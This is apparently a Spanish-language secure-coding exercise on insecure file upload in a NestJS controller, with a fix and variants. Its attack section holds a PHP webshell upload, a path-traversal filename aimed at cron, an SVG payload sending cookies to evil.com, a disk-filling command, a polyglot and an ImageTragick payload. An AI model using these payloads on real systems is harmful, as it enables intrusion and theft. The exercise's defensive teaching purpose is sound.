# Paso 20 — Insecure File Upload
**Tecnologia:** TypeScript / NestJS | **OWASP:** A04:2021 - Insecure Design / A01:2021 | **CWE-434**

---

## Que es esta vulnerabilidad?

Insecure File Upload ocurre cuando una aplicacion acepta archivos del usuario sin validar correctamente el tipo, el tamano, el contenido o el nombre del archivo. Las consecuencias pueden incluir:

- **RCE (Remote Code Execution):** subir un archivo `.php`, `.jsp` o `.py` en un servidor que ejecuta scripts, y luego acceder a el via URL para ejecutar codigo.
- **Path Traversal via nombre:** subir un archivo con nombre `../../etc/cron.d/backdoor` que se guarda fuera del directorio previsto.
- **XSS via SVG/HTML:** subir un archivo SVG con JavaScript embebido que se ejecuta en el navegador de otros usuarios.
- **DoS por disco lleno:** subir archivos de tamano arbitrario hasta agotar el espacio en disco del servidor.
- **Malware hosting:** usar el servidor como repositorio de malware que se sirve a terceros.

---

## Donde ocurre en este codigo?

**Archivo:** `src/typescript/src/upload.controller.ts`

```typescript
// CODIGO VULNERABLE — estado actual del ejercicio
@Controller('files')
export class UploadController {
  @Post('/upload')
  @UseInterceptors(FileInterceptor('file'))
  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
    return { filename: file.originalname };  // nombre original del usuario, sin validacion
  }
}
```

Problemas:
1. **Sin validacion de MIME type ni extension:** se acepta cualquier tipo de archivo
2. **Sin limite de tamano:** el archivo puede ser de cualquier tamano
3. **Se retorna `file.originalname`:** el nombre original del atacante se devuelve y potencialmente se usa para guardar el archivo
4. **Sin generacion de nombre seguro:** si el archivo se guarda con el nombre original, hay path traversal

---

## Como lo explotaria un atacante

**Subida de webshell PHP:**
```bash
# Crear una webshell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST /files/upload -F 'file=@shell.php'
# Si el servidor sirve el directorio de uploads como estatico:
curl 'https://app.empresa.com/uploads/shell.php?cmd=id'
# El servidor ejecuta: uid=33(www-data)
```

**Path traversal via nombre de archivo:**
```bash
# El cliente puede controlar el nombre del archivo
curl -X POST /files/upload \
  -F 'file=@evil.sh;filename=../../../../etc/cron.d/backdoor'
# Si el servidor guarda con el nombre original: sobrescribe el cron
```

**XSS via SVG:**
```xml
<!-- evil.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://evil.com/steal?c='+document.cookie</script>
</svg>
```
```bash
curl -X POST /files/upload -F 'file=@evil.svg'
# Si otro usuario accede a la URL del archivo SVG, el JS se ejecuta en su navegador
```

**DoS por disco lleno:**
```bash
# Crear un archivo de 10GB y subirlo
dd if=/dev/urandom of=bigfile bs=1M count=10000
curl -X POST /files/upload -F 'file=@bigfile'
# El disco del servidor se llena, el servicio cae
```

---

## Tu tarea: aplicar la mitigacion

Modifica `src/typescript/src/upload.controller.ts` para validar tipo, tamano y generar un nombre seguro:

```typescript
// CODIGO SEGURO
import {
  Controller, Post, UploadedFile, UseInterceptors, BadRequestException
} from '@nestjs/common';
import { FileInterceptor } from '@nestjs/platform-express';
import { randomUUID } from 'crypto';
import * as path from 'path';

// Tipos MIME permitidos (lista blanca, no lista negra)
const ALLOWED_MIME_TYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/gif',
  'image/webp',
  'application/pdf',
]);

// Extensiones permitidas (mapeadas desde MIME)
const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf']);

// Limite de tamano: 5 MB
const MAX_FILE_SIZE = 5 * 1024 * 1024;

@Controller('files')
export class UploadController {
  @Post('/upload')
  @UseInterceptors(FileInterceptor('file', {
    limits: { fileSize: MAX_FILE_SIZE },  // limite de tamano en multer
  }))
  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
    if (!file) {
      throw new BadRequestException('No se recibio ningun archivo');
    }

    // Validar MIME type reportado por multer
    if (!ALLOWED_MIME_TYPES.has(file.mimetype)) {
      throw new BadRequestException(`Tipo de archivo no permitido: ${file.mimetype}`);
    }

    // Validar extension del nombre original
    const ext = path.extname(file.originalname).toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      throw new BadRequestException(`Extension no permitida: ${ext}`);
    }

    // Validar tamano (aunque multer ya limita, verificacion adicional)
    if (file.size > MAX_FILE_SIZE) {
      throw new BadRequestException('Archivo demasiado grande');
    }

    // Generar nombre aleatorio: evita path traversal y colisiones
    const safeFilename = `${randomUUID()}${ext}`;

    // Aqui se guardaria el archivo con safeFilename, no con file.originalname
    // fs.writeFileSync(path.join('/var/uploads', safeFilename), file.buffer);

    return { filename: safeFilename };
  }
}
```

### Por que funciona esta mitigacion?

- **`ALLOWED_MIME_TYPES` (allowlist):** en lugar de bloquear tipos peligrosos (lista negra, facil de evadir), solo se permiten los tipos estrictamente necesarios. Un archivo `.php` tiene MIME `application/x-php` o `text/plain`, ninguno en la lista.
- **`ALLOWED_EXTENSIONS` (allowlist):** validacion de extension adicional. Un archivo `shell.php.jpg` tendra extension `.jpg`, pero `file.mimetype` sera `application/x-php`, fallando la validacion de MIME.
- **`randomUUID()`:** el nombre del archivo almacenado es un UUID aleatorio. No hay relacion con el nombre original del atacante. Previene path traversal y sobreescritura de archivos existentes.
- **`limits: { fileSize: MAX_FILE_SIZE }`:** multer rechaza el archivo antes de procesarlo completo si supera el limite, previniendo DoS por disco.

---

## Variantes de la misma categoria (Insecure Design / Upload — mas complejas)

### Variante A: Polyglot Files (archivos que son validos en dos formatos)

Un archivo polyglot es valido en dos formatos simultaneamente. Por ejemplo, un archivo puede ser tanto un JPEG valido como un PHP ejecutable:

```bash
# Crear un polyglot JPEG/PHP
# El JPEG magic bytes al inicio satisfacen la validacion de imagen
# El codigo PHP al final se ejecuta si el servidor lo procesa como PHP
printf '\xff\xd8\xff\xe0' > polyglot.jpg  # magic bytes de JPEG
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg

# file polyglot.jpg: JPEG image data
# Si se sube como imagen y se ejecuta como PHP: RCE
```

```typescript
// MITIGACION ADICIONAL: verificar magic bytes del contenido real
import * as fileType from 'file-type';

async uploadSecure(file: Express.Multer.File) {
  const type = await fileType.fromBuffer(file.buffer);
  if (!type || !ALLOWED_MIME_TYPES.has(type.mime)) {
    throw new BadRequestException('Contenido del archivo no coincide con el tipo declarado');
  }
  // file-type lee los magic bytes reales del buffer, no el MIME del cliente
}
```

---

### Variante B: ImageMagick / FFmpeg procesamiento de archivos maliciosos (ImageTragick)

```typescript
// VULNERABLE — procesar imagenes sin validar el contenido
@Post('/resize')
async resizeImage(file: Express.Multer.File) {
  // ImageMagick < 6.9.3-9 procesaba directivas MVG/SVG que ejecutaban comandos
  await execFile('convert', [file.path, '-resize', '100x100', output]);
}
```

Un archivo con extension `.jpg` pero contenido MVG:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|id > /tmp/rce")'
pop graphic-context
```

```typescript
// SEGURO — usar sharp (libreria nativa Node.js sin dependencia de ImageMagick)
import sharp from 'sharp';

@Post('/resize')
async resizeImage(file: Express.Multer.File) {
  const output = path.join('/var/uploads', randomUUID() + '.jpg');
  await sharp(file.buffer)
    .resize(100, 100)
    .jpeg({ quality: 80 })
    .toFile(output);  // sharp rechaza archivos que no son imagenes validas
  return { filename: path.basename(output) };
}
```

---

### Variante C: Upload a almacenamiento en la nube sin politica de acceso

```typescript
// VULNERABLE — subir a S3 con ACL public-read sin validacion
async uploadToS3(file: Express.Multer.File) {
  await s3.upload({
    Bucket: 'empresa-uploads',
    Key: file.originalname,  // nombre controlado por el atacante
    Body: file.buffer,
    ACL: 'public-read',      // cualquiera en internet puede descargarlo
    ContentType: file.mimetype,  // MIME reportado por el cliente, no verificado
  }).promise();
  return { url: `https://empresa-uploads.s3.amazonaws.com/${file.originalname}` };
}
```

```typescript
// SEGURO — nombre generado, ACL privada, MIME verificado
async uploadToS3(file: Express.Multer.File) {
  const detectedType = await fileType.fromBuffer(file.buffer);
  if (!detectedType || !ALLOWED_MIME_TYPES.has(detectedType.mime)) {
    throw new BadRequestException('Tipo de archivo no valido');
  }
  const safeKey = `uploads/${randomUUID()}${path.extname(file.originalname).toLowerCase()}`;
  await s3.upload({
    Bucket: 'empresa-uploads',
    Key: safeKey,
    Body: file.buffer,
    ACL: 'private',              // no publico por defecto
    ContentType: detectedType.mime,  // MIME verificado del contenido real
  }).promise();
  // Devolver una URL pre-firmada con expiracion, no la URL publica
  const signedUrl = await s3.getSignedUrlPromise('getObject', {
    Bucket: 'empresa-uploads',
    Key: safeKey,
    Expires: 3600,  // URL valida por 1 hora
  });
  return { url: signedUrl };
}
```

---

## Referencias

- [OWASP A04:2021 - Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CVE-2016-3714 - ImageTragick](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 20** exige que `src/typescript/src/upload.controller.ts` contenga:
- `ALLOWED_MIME_TYPES`
- `ALLOWED_EXTENSIONS`
- `randomUUID`
- `fileSize`
- La ausencia de `return { filename: file.originalname }`
